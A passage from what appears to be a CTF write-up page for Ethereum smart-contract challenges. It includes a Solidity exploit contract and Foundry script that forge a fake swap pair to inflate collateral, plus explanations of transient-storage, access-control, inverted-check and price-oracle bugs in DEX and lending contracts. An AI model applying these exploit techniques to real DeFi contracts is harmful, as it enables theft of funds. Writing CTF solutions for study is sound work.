+        <span class="n">fake</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">fakePair</span><span class="p">,</span> <span class="n">addressAmount</span> <span class="o">*</span> <span class="mi">2</span><span class="p">);</span>
+        <span class="n">weth</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">2</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+        <span class="n">weth</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">fakePair</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">IBi0sSwapPair</span><span class="p">(</span><span class="n">fakePair</span><span class="p">).</span><span class="n">addLiquidity</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+
+        <span class="n">weth</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">usdsEngine</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">usdsEngine</span><span class="p">.</span><span class="n">depositCollateralThroughSwap</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="kt">uint256</span> <span class="n">FLAG_HASH</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">"YOU NEED SOME BUCKS TO GET FLAG"</span><span class="p">));</span>
+        <span class="n">usdsEngine</span><span class="p">.</span><span class="n">bi0sSwapv1Call</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">),</span> <span class="n">FLAG_HASH</span> <span class="o">+</span> <span class="kt">uint160</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">FLAG_HASH</span><span class="p">));</span>
+        <span class="n">usdsEngine</span><span class="p">.</span><span class="n">bi0sSwapv1Call</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">safeMoon</span><span class="p">),</span> <span class="n">FLAG_HASH</span> <span class="o">+</span> <span class="kt">uint160</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">FLAG_HASH</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Solve</span> <span class="k">is</span> <span class="n">Script</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
+        <span class="n">Setup</span> <span class="n">setup</span><span class="o">=</span><span class="n">Setup</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"SETUP"</span><span class="p">));</span>
+        <span class="n">Exploiter</span> <span class="n">exploiter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploiter</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">80</span><span class="n">_000</span> <span class="kc">ether</span><span class="p">}(</span><span class="n">setup</span><span class="p">);</span>
+        <span class="n">exploiter</span><span class="p">.</span><span class="n">exploit</span><span class="p">();</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><h2 id="transient-heist-revenge">Transient Heist Revenge<a href="#transient-heist-revenge" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>The setup</p><blockquote><p>Create WETH/USDC, WETH/SafeMoon, and SafeMoon/USDC pools. The user starts with <code class="language-plaintext highlighter-rouge">80_001e18</code> WETH.</p></blockquote><p>The goal</p><blockquote><p>Make the collateral deposited exceed the hash amount.</p></blockquote><h3 id="revenge-chall">Revenge chall<a href="#revenge-chall" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>The <code class="language-plaintext highlighter-rouge">acceptedToken</code> modifier only checks the <code class="language-plaintext highlighter-rouge">collateralToken</code>. With 80,000 WETH, we can obtain a significant amount of SafeMoon tokens. If we can create a contract address with seven leading zeros, we can set <code class="language-plaintext highlighter-rouge">tokensSentBack</code> to match the user’s address. After swap, we can send <code class="language-plaintext highlighter-rouge">amount - (contract address)</code> to the user vault to set <code class="language-plaintext highlighter-rouge">amountOut</code> to the user’s address. Then, by directly calling <code class="language-plaintext highlighter-rouge">bi0sSwapv1Call</code>, we can set an arbitrary collateral deposit amount.</p><p>The exploit requires a vanity contract address, not EOA because we should use transient storage.</p><blockquote><p>cast create2 –starts-with “0000000” –init-code-hash “<del>” –deployer “</del>”</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">bi0sSwapv1Call</span><span class="p">(</span><span class="kt">address</span> <span class="n">sender</span><span class="p">,</span><span class="kt">address</span> <span class="n">collateralToken</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">,</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReEntrant</span> <span class="p">{</span>
+        <span class="kt">uint256</span> <span class="n">collateralDepositAmount</span><span class="o">=</span><span class="n">abi</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">,(</span><span class="kt">uint256</span><span class="p">));</span>
+        <span class="kt">address</span> <span class="n">bi0sSwapPair</span><span class="p">;</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">bi0sSwapPair</span><span class="o">:=</span><span class="n">tload</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="o">!=</span><span class="n">bi0sSwapPair</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">USDSEngine__Only__bi0sSwapPair__Can__Call</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">collateralDepositAmount</span><span class="o">&gt;</span><span class="n">amountOut</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">USDSEngine__Insufficient__Collateral</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="kt">uint256</span> <span class="n">tokensSentToUserVault</span><span class="o">=</span><span class="n">amountOut</span><span class="o">-</span><span class="n">collateralDepositAmount</span><span class="p">;</span>
+        <span class="n">user_vault</span><span class="p">[</span><span class="n">sender</span><span class="p">][</span><span class="n">collateralToken</span><span class="p">]</span><span class="o">+=</span><span class="n">tokensSentToUserVault</span><span class="p">;</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">tstore</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">tokensSentToUserVault</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="n">collateralDeposited</span><span class="p">[</span><span class="n">sender</span><span class="p">][</span><span class="n">collateralToken</span><span class="p">]</span><span class="o">+=</span><span class="n">collateralDepositAmount</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></table></code></div></div></blockquote><h2 id="vastavikamania-token">Vastavikamania token<a href="#vastavikamania-token" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>The setup</p><blockquote><p>Deploy three VSTETH token pairs and send some WETH to the balancer contract.</p></blockquote><p>The goal</p><blockquote><p>Earn over 141.3 ether.</p></blockquote><h3 id="analyze-a-bit-2">Analyze a bit<a href="#analyze-a-bit-2" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>There were two unintended solutions. The first one is setting the player address to the WETH contract address.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">setPlayer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_player</span><span class="p">)</span><span class="k">public</span><span class="p">{</span>
+        <span class="n">player</span><span class="o">=</span><span class="n">_player</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span><span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="nb">balance</span><span class="o">&lt;</span> <span class="mf">141.3</span> <span class="kc">ether</span><span class="p">){</span>
+            <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><p>Another bug is in the <code class="language-plaintext highlighter-rouge">takeOffLiquidity</code> function. It incorrectly permits users to withdraw more than their available balance</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">takeOffLiquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">_token</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span><span class="k">external</span> <span class="n">nonReentrant</span><span class="p">{</span>
+        <span class="kt">uint256</span> <span class="n">user_balance</span><span class="o">=</span><span class="n">tokenBalances</span><span class="p">[</span><span class="n">_token</span><span class="p">][</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">_amount</span><span class="o">&lt;</span><span class="n">user_balance</span><span class="p">){</span> <span class="c1">// @audit-info should use `&gt;`
+</span>            <span class="nb">revert</span> <span class="n">Balancer__Insufficient__User__Balance</span><span class="p">(</span><span class="n">_amount</span><span class="p">,</span><span class="n">user_balance</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">_token</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><p>The intended solution was to borrow all WETH from the balancer and execute a sequence of <code class="language-plaintext highlighter-rouge">buyQuote</code> -&gt; <code class="language-plaintext highlighter-rouge">addVasthavikamainaLiquidity</code> -&gt; <code class="language-plaintext highlighter-rouge">sellQuote</code> functions to generate profit across three pools. After swapping all borrowed WETH for lamboToken, we can add liquidity to a pool with an increased lamboToken price. By providing half of the tokens as liquidity, we can generate additional profit through the increased <code class="language-plaintext highlighter-rouge">K</code> value in the pair.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">addVasthavikamainaLiquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">_vasthavikamainaToken</span><span class="p">,</span><span class="kt">address</span> <span class="n">_lamboToken</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_loanAmount</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_quoteAmount</span><span class="p">)</span><span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">_whiteList</span><span class="p">[</span><span class="n">_vasthavikamainaToken</span><span class="p">]){</span>
+            <span class="nb">revert</span> <span class="n">Factory__VasthavikamainaToken__Not_WhiteListed</span><span class="p">(</span><span class="n">_vasthavikamainaToken</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="kt">address</span> <span class="n">_uniPair</span><span class="o">=</span><span class="n">__calculatePoolAddress</span><span class="p">(</span><span class="n">_vasthavikamainaToken</span><span class="p">,</span><span class="n">_lamboToken</span><span class="p">);</span>
+        <span class="p">(</span><span class="kt">address</span> <span class="n">_token0</span><span class="p">,)</span><span class="o">=</span><span class="n">__getToken0andToken1</span><span class="p">(</span><span class="n">_vasthavikamainaToken</span><span class="p">,</span><span class="n">_lamboToken</span><span class="p">);</span>
+        <span class="p">(</span><span class="kt">uint112</span> <span class="n">_reserve0</span><span class="p">,</span><span class="kt">uint112</span> <span class="n">_reserve1</span><span class="p">,)</span><span class="o">=</span><span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">_uniPair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
+        <span class="kt">uint256</span> <span class="n">_lamboTokens_To_Transfer</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">_token0</span><span class="o">==</span><span class="n">_vasthavikamainaToken</span><span class="p">){</span>
+            <span class="n">_lamboTokens_To_Transfer</span><span class="o">=</span> <span class="p">(</span><span class="n">_loanAmount</span><span class="o">*</span><span class="n">_reserve1</span><span class="p">)</span><span class="o">/</span><span class="n">_reserve0</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="n">_lamboTokens_To_Transfer</span><span class="o">=</span> <span class="p">(</span><span class="n">_loanAmount</span><span class="o">*</span><span class="n">_reserve0</span><span class="p">)</span><span class="o">/</span><span class="n">_reserve1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">VasthavikamainaToken</span><span class="p">(</span><span class="n">_vasthavikamainaToken</span><span class="p">).</span><span class="n">takeLoan</span><span class="p">(</span><span class="n">_uniPair</span><span class="p">,</span> <span class="n">_loanAmount</span><span class="p">);</span>
+        <span class="n">LamboToken</span><span class="p">(</span><span class="n">_lamboToken</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">_uniPair</span><span class="p">,</span> <span class="n">_lamboTokens_To_Transfer</span><span class="p">);</span>
+        <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">_uniPair</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+
+        <span class="k">emit</span> <span class="n">Factory__LiquidityAdded</span><span class="p">(</span><span class="n">_vasthavikamainaToken</span><span class="p">,</span><span class="n">_lamboToken</span><span class="p">,</span><span class="n">_loanAmount</span><span class="p">,</span><span class="n">_lamboTokens_To_Transfer</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">_lamboTokens_To_Transfer</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><h2 id="the-time-travellers-dex">The Time Travellers DEX<a href="#the-time-travellers-dex" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>The setup</p><blockquote><p>The Finance contract has 250,000 ether, 500,000 WETH, and 11,500,000,000 INR. The DEX contract has an LP with 50,000 WETH and 230,000 INR.</p></blockquote><p>The goal</p><blockquote><p><code class="language-plaintext highlighter-rouge">dex</code> contract should maintain initial supply, but user should extract over 100_000 WETH, <code class="language-plaintext highlighter-rouge">230000 * 100000</code> INR and 89835 ether with 6 swaps.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">solve</span><span class="p">()</span><span class="k">external</span><span class="p">{</span>
+        <span class="kt">address</span> <span class="n">_msgSender</span><span class="o">=</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_msgSender</span><span class="p">)</span><span class="o">&lt;</span> <span class="mi">100</span><span class="n">_000</span> <span class="kc">ether</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Insufficient_WETH_To_Solve</span><span class="p">();</span>
+        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">INR</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_msgSender</span><span class="p">)</span><span class="o">&lt;</span> <span class="mi">2</span><span class="n">_30_000</span> <span class="o">*</span> <span class="mi">100</span><span class="n">_000</span> <span class="kc">ether</span> <span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Insufficient_INR_To_Solve</span><span class="p">();</span>
+        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">_msgSender</span><span class="p">.</span><span class="nb">balance</span><span class="o">&lt;</span> <span class="mi">89</span><span class="n">_835</span> <span class="kc">ether</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Insufficient_ETH_To_Solve</span><span class="p">();</span>
+        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">dex</span><span class="p">.</span><span class="n">reserve0</span><span class="p">()</span><span class="o">&lt;</span><span class="n">WETH_SUPPLIED_BY_LP</span> <span class="o">||</span> <span class="n">dex</span><span class="p">.</span><span class="n">reserve1</span><span class="p">()</span><span class="o">&lt;</span><span class="n">INR_SUPPLIED_BY_LP</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Setup_Dex_Pool_Ratio_Changed</span><span class="p">();</span>
+        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">dex</span><span class="p">.</span><span class="n">swaps_count</span><span class="p">()</span><span class="o">&gt;</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">6</span><span class="p">)){</span>
+            <span class="nb">revert</span> <span class="n">Setup_DEX_Swap_Count_Limit_Exceeds</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">solved</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></table></code></div></div></blockquote><h3 id="analyze-a-bit-3">Analyze a bit<a href="#analyze-a-bit-3" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>The finance contract provides functions, stake, withdraw, flashLoan</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">stake</span><span class="p">(</span><span class="kt">address</span> <span class="n">_tokenOut</span><span class="p">)</span><span class="k">external</span> <span class="k">payable</span>  <span class="n">approvedChecker</span><span class="p">(</span><span class="n">_tokenOut</span><span class="p">)</span><span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="o">&lt;</span><span class="n">MIN_STAKE</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">FINANCE_Invalid_Stake_Amount</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">,</span><span class="n">MIN_STAKE</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">_tokenOut</span><span class="o">==</span><span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">)){</span>
+            <span class="n">Currency</span><span class="p">(</span><span class="n">_tokenOut</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+            <span class="n">LatestBalances</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">)]</span><span class="o">-=</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+            <span class="k">return</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="p">(</span><span class="kt">uint256</span> <span class="n">_wethPriceInInr</span><span class="p">,)</span><span class="o">=</span><span class="nb">this</span><span class="p">.</span><span class="n">getPrice</span><span class="p">();</span>
+            <span class="kt">uint256</span> <span class="n">_tokensToMinted</span><span class="o">=</span> <span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="o">*</span><span class="n">_wethPriceInInr</span><span class="p">)</span><span class="o">/</span><span class="p">(</span> <span class="mi">2</span><span class="o">**</span><span class="mi">112</span><span class="p">);</span>
+            <span class="n">Currency</span><span class="p">(</span><span class="n">_tokenOut</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span><span class="n">_tokensToMinted</span><span class="p">);</span>
+            <span class="n">LatestBalances</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">INR</span><span class="p">)]</span><span class="o">-=</span><span class="n">_tokensToMinted</span><span class="p">;</span>
+            <span class="k">return</span> <span class="n">_tokensToMinted</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><p>we can stake over 0.5 ether to get WETH or INR. the amount of INR is determined by <code class="language-plaintext highlighter-rouge">getPrice</code> function.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="kt">address</span> <span class="n">_token</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span><span class="k">external</span> <span class="n">nonReentrant</span> <span class="n">approvedChecker</span><span class="p">(</span><span class="n">_token</span><span class="p">){</span>
+        <span class="kt">uint256</span> <span class="n">_tokensReceived</span><span class="o">=</span><span class="n">Currency</span><span class="p">(</span><span class="n">_token</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span><span class="o">-</span><span class="n">feesCollected</span><span class="p">[</span><span class="n">_token</span><span class="p">]</span><span class="o">-</span><span class="n">LatestBalances</span><span class="p">[</span><span class="n">_token</span><span class="p">];</span>
+        
+        <span class="k">if</span><span class="p">(</span><span class="n">_tokensReceived</span><span class="o">&lt;</span><span class="n">_amount</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">FINANCE_Expected_Amount_Not_Transferred</span><span class="p">(</span><span class="n">_amount</span><span class="p">,</span><span class="n">_tokensReceived</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">LatestBalances</span><span class="p">[</span><span class="n">_token</span><span class="p">]</span><span class="o">+=</span><span class="n">_tokensReceived</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">_token</span><span class="o">==</span><span class="kt">address</span><span class="p">(</span><span class="n">WETH</span><span class="p">)){</span>
+            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span><span class="o">=</span><span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">_tokensReceived</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">){</span>
+                <span class="nb">revert</span> <span class="n">FINANCE_Withdraw_Failed</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="p">(</span><span class="kt">uint256</span> <span class="n">_WethPriceInInr</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_InrPriceInWeth</span><span class="p">)</span><span class="o">=</span><span class="nb">this</span><span class="p">.</span><span class="n">getPrice</span><span class="p">();</span>
+            <span class="kt">uint256</span> <span class="n">_Eth_To_Transfer</span><span class="o">=</span> <span class="p">((</span><span class="n">_InrPriceInWeth</span><span class="o">*</span> <span class="n">_tokensReceived</span> <span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">112</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="c1">//rounding up 
+</span>            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span><span class="o">=</span><span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">_Eth_To_Transfer</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span> 
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">){</span>
+                <span class="nb">revert</span> <span class="n">FINANCE_Withdraw_Failed</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>   
+    <span class="p">}</span>
+</pre></table></code></div></div><p>The withdraw functions is similar. By sending WETH or INR token, can get back ether, the price determined by <code class="language-plaintext highlighter-rouge">getPrice</code> function when withdrawing INR.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">timeElapsed</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">_time</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_time</span><span class="o">=</span><span class="n">block</span><span class="p">.</span><span class="n">timestamp</span><span class="o">-</span><span class="n">lastSnapshotTime</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">snapshot</span><span class="p">()</span><span class="k">public</span><span class="p">{</span>
+        <span class="p">(</span><span class="kt">uint256</span> <span class="n">_price0</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_price1</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_lastTimeStamp</span><span class="p">)</span><span class="o">=</span><span class="n">dex</span><span class="p">.</span><span class="n">get_Cumulative_Prices</span><span class="p">();</span>
+        <span class="kt">uint256</span> <span class="n">time_Elapsed</span><span class="o">=</span><span class="n">timeElapsed</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">time_Elapsed</span><span class="o">&lt;</span> <span class="mi">1</span> <span class="kc">minutes</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">FINANCE_Price_Is_Not_Yet_Expired</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">wethPriceCumulative</span><span class="o">=</span><span class="n">_price0</span><span class="p">;</span>
+        <span class="n">inrPriceCumulative</span><span class="o">=</span><span class="n">_price1</span><span class="p">;</span>
+        <span class="n">lastSnapshotTime</span><span class="o">=</span><span class="n">_lastTimeStamp</span><span class="p">;</span>
+    <span class="p">}</span>
+    
